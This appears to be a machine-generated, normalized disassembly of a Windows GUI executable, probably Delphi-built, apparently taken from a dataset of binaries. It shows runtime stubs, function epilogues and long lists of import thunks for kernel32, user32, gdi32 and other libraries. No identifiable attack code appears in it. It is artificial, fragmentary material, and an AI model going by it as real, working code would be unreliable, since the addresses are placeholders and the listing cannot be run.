mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c76
jmp sub_4036f8
sub_403cd6
jmp sub_4036f8
sub_403cf0
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403be8
mov [ rw-data ] 0x0
call sub_403c90
retn
sub_403e29
retn
sub_403f8b
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f90
mov [ rw-data ] eax
call sub_403eb8
sub_4041cc
retn
sub_404208
retn
sub_404216
retn
sub_40422f
retn
sub_404240
retn
sub_404327
retn
sub_404458
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404474
jmp sub_404474
sub_4044bd
retn
sub_4044c5
retn
sub_404507
retn
sub_404660
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_404678
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4047d0
retn
sub_4047e2
retn
sub_4047e4
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4049d8
mov ecx 0x1
jmp sub_404944
sub_4049e2
retn
sub_404a18
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404b1c
mov ecx 0x1
jmp sub_404a30
sub_404b26
retn
sub_404b28
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404d4e
retn
sub_404d50
push edx
call sub_4026bc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_4049d8
pop eax
sub_404d64
push eax
call sub_404b1c
pop eax
call sub_4026dc
retn
sub_404d74
mov al 0x11
jmp sub_402818
sub_404d9f
retn
sub_404e1a
retn
sub_404e2c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c5c
pop ebp
retn 0x4
j_sub_404a30
jmp sub_404a30
sub_404e41
retn
sub_404e44
call sub_404fe4
retn
sub_405070
call sub_405048
retn
sub_4053b9
jmp sub_4039ac
sub_405524
call sub_40552c
retn
sub_405558
call sub_405568
retn
sub_405560
call sub_405588
retn
sub_405568
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405623
jmp sub_4036f8
sub_405644
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4056b8
jmp sub_4039ac
sub_4056bf
pop ecx
pop ebp
retn
sub_405738
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405744
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405750
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_405760
call sub_4031f0
mov [ eax + 0x4 ] 0x1
retn
sub_405798
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405a87
jmp sub_4039ac
sub_405a8e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b2b
jmp sub_4039ac
sub_405b32
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b7b
jmp sub_4039ac
sub_405b82
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c46
jmp sub_4039ac
sub_405c4d
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405c9e
jmp sub_4039ac
sub_405ca5
pop ebp
retn
sub_405d7c
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405d9c
push eax
push 0x40
call LocalAlloc
retn
sub_405da8
mov eax 0x10
retn
sub_405e34
mov eax rw-data
call sub_405644
retn
sub_405ea9
jmp sub_4039ac
sub_405eb0
pop ebp
retn
sub_405eb4
sub [ rw-data ] 0x1
retn
sub_405ebc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405ed8
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405f21
jmp sub_4039ac
sub_405f28
pop ebp
retn
sub_405f2c
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ CreateThread@IAT ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFileAttributesA
jmp [ __import_lookup_table_6(kernel32:GetFileAttributesA) ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406210
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:DeleteEnhMetaFile) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
jmp [ __import_lookup_table_8(gdi32:GetTextMetricsA) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
ScaleWindowExtEx
jmp [ __import_lookup_table_8(gdi32:ScaleWindowExtEx) ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDlgItem
jmp [ GetDlgItem@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_4069a4
call GetTickCount
retn
sub_4069ac
xor eax eax
retn
sub_4069b0
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_4069c0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_4069dc
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_4069f0
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406a28
call sub_406998
retn
sub_406a30
call sub_406998
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406c0d
jmp sub_4039ac
sub_406c14
pop ebp
retn
sub_406c18
sub [ rw-data ] 0x1
retn
sub_406c45
jmp sub_4039ac
sub_406c4c
pop ebp
retn
sub_406c50
sub [ rw-data ] 0x1
retn
sub_406f65
jmp sub_4039ac
sub_406f6c
pop ebp
retn
sub_406f70
sub [ rw-data ] 0x1
retn
sub_407a45
add eax 0xffffffd4
jmp sub_40d090
sub_407a4d
add eax 0xffffffd4
jmp sub_40d12c
sub_407a5f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405798
sub_407a69
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4057ac
sub_407b40
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
pop ebx
retn
sub_407e18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407de0
test eax eax
sete al
pop esi
pop ebx
retn
sub_408376
jmp sub_4039ac
sub_40837d
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_408384
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408310
pop esi
pop ebx
retn
sub_408414
call sub_4083f0
retn
sub_4084ac
push eax
call CloseHandle
retn
sub_40851c
push ebx
mov ebx eax
mov eax ebx
call sub_4084b4
inc eax
setne al
pop ebx
retn
sub_4086f4
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408708
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_4088c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4041a0
pop esi
pop ebx
retn
sub_4088dc
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4088f0
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408928
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_408990
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_4089b4
push ebx
mov ebx eax
mov eax ebx
call sub_403fa8
pop ebx
retn
sub_408d17
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403fa8
pop eax
pop ebx
retn
sub_408fcf
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40912a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409487
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409487
sub_409544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404468
mov edx esi
xor ecx ecx
call sub_4093d0
pop esi
pop ebx
retn
sub_4095b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404468
mov edx esi
mov cl 0x1
call sub_4093d0
pop esi
pop ebx
retn
sub_409cf2
jmp sub_4039ac
sub_409cf9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409dea
jmp sub_4039ac
sub_409df1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a595
jmp sub_4039ac
sub_40a59c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a624
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a5c8
pop ebp
retn 0x8
sub_40a769
jmp sub_4039ac
sub_40a770
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ac13
jmp sub_4039ac
sub_40ac1a
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b0ff
jmp sub_4039ac
sub_40b106
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b1b1
jmp sub_4039ac
sub_40b1b8
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b25b
jmp sub_4039ac
sub_40b262
pop esi
pop ecx
pop ebp
retn
sub_40b43e
jmp sub_4039ac
sub_40b445
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b49c
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b78e
jmp sub_4039ac
sub_40b85c
jmp sub_4039ac
sub_40b884
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_40320c
sub_40b980
pop ebx
retn
sub_40ba20
jmp sub_4039ac
sub_40ba27
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ba30
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039e4
sub_40ba3d
retn
sub_40ba40
push ebp
mov ebp esp
call sub_40b984
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40ba30
pop ebp
retn 0x4
sub_40ba5c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
retn
sub_40baf4
push ebx
mov ebx eax
mov eax ebx
call sub_40ba74
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bcc7
jmp sub_4039ac
sub_40bcce
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd93
jmp sub_4039ac
sub_40bd9a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bda4
call sub_40b630
mov eax 0x1
call sub_403f90
sub_40bf28
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c001
jmp sub_4039ac
sub_40c01e
jmp sub_4039ac
sub_40c025
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c0d0
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c034
mov ecx eax
sub_40c2bc
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c2dc
push eax
call CharNextA
retn
sub_40c644
jmp sub_4039ac
sub_40c64b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c6b4
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cb0b
jmp sub_4039ac
sub_40cb12
pop ebx
mov esp ebp
pop ebp
retn
sub_40ccdb
jmp sub_4039ac
sub_40cce2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cd84
jmp sub_4039ac
sub_40cd8b
pop ebx
mov esp ebp
pop ebp
retn
sub_40cd90
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40ccf4
sub_40cda0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cdbc
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40ce44
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40ce50
xchg [ eax ] edx
mov eax edx
retn
sub_40ceb0
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40cf40
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d058
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d080
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d2fb
jmp sub_4039ac
sub_40d302
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d370
jmp sub_4039ac
sub_40d377
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d395
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d38e
jmp sub_4039ac
sub_40d395
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d7e5
jmp sub_4039ac
sub_40d7ec
pop ebp
retn
sub_40d858
jmp sub_4039ac
sub_40d85f
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40d8d8
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d93e
jmp sub_4039ac
sub_40d945
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d9aa
jmp sub_4039ac
sub_40d9b1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da16
jmp sub_4039ac
sub_40da1d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da82
jmp sub_4039ac
sub_40da89
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40daee
jmp sub_4039ac
sub_40daf5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db6d
